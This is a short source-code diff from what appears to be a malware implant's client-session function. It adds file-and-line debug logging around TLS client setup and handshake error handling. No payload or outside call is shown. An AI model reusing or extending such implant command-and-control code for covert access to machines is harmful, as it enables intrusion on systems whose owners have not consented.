@@ -624,24 +624,26 @@ unsigned long StartClientSession( int sock )
 	int retval = 0;
 	char* commandpath = 0;
 
+	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
 	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
 	{
-		D( printf( " ERROR: crypt_setup_client()\n" ); )
+		D( printf( "%s:%i: ERROR: crypt_setup_client()\n", __FILE__, __LINE__ ); );
 			crypt_cleanup( &trig_ssl);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 
 	// start TLS handshake
+	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
 	if ( crypt_handshake(&trig_ssl) != SUCCESS )
 	{
-		D( printf( " ERROR: TLS connection with TLS server failed to initialize.\n" ); )
+		D( printf( "%s:%i ERROR: TLS connection with TLS server failed to initialize.\n", __FILE__, __LINE__ ); );
 			crypt_cleanup( &trig_ssl);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
-	D( printf( " DEBUG: TLS handshake complete.\n" ); )
+	D( printf( "%s:%i TLS handshake complete.\n", __FILE__, __LINE__ ); );
 
 
 		while(!fQuit)
